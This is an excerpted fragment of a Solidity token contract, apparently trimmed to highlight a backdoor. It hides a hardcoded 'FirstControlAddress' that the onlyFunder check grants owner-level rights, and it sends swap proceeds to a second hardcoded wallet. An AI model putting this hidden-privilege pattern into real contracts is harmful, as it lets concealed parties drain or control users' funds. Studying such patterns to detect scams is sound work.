...
abstract contract LONGToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;
    address private FirstControlAddress =
        address(0xc78e2852De5101FFD483B012fDB568fbf809F100);
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        address secFundAddress = 0x5E0913dc56639C785c7bbF60f0bf93AFAaE31068;
    ...
    modifier onlyFunder() {
        require(_owner == msg.sender || FirstControlAddress == msg.sender, "!Funder");
        _;
    }
...
contract LONG is LONGToken {
    constructor() LONGToken(
